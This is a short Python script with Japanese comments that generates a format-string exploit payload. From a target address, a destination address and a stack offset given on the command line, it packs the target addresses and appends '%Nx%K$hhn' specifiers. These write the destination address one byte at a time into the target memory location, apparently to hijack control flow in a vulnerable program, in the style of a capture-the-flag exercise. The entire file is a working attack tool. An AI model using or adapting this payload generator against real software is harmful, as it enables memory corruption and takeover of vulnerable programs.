#! /usr/bin/env python
# coding: utf-8

import sys
import struct

# ターゲットアドレス
tgt_addr = int(sys.argv[1], 16) 
# 飛ばしたい宛先アドレス
dst_addr = int(sys.argv[2], 16)
# オフセット 
offset = int(sys.argv[3])

# 書き込み用文字列
code = b''

for i in range(4):
    code += ((tgt_addr+i).to_bytes(4, byteorder='little'))

dst = (dst_addr.to_bytes(4, byteorder='little'))

shift = 16

# バイトずつ値を書き込み
for i in range(len(dst)):
    dst_pos = (dst[i] - shift) % 256
    code += bytes(("%"+str(dst_pos) +"x%"+str(offset+i)+"$hhn").encode('utf-8'))
    shift +=dst_pos
 
print(code)